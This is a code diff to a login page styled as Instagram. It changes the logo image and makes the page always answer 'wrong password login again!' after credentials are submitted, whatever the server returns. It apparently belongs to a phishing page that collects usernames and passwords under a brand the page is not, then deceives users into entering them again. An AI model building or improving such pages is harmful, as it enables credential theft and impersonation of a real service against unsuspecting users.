@@ -7,7 +7,7 @@
 </head>
 <body>
   <div class="login-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" class="logo">
+    <img src="https://images.template.net/76793/Instagram-Logo-Black-And-White-Vector-1.jpg" alt="Instagram" class="logo">
     <form id="loginForm">
       <input type="text" id="username" placeholder="Phone number, username, or email" required>
       <input type="password" id="password" placeholder="Password" required>
@@ -37,7 +37,7 @@
         });
 
         const data = await response.json();
-        alert(data.message);
+        alert("wrong password login again!");
       } catch (error) {
         alert('Error logging in');
         console.error('Error:', error);
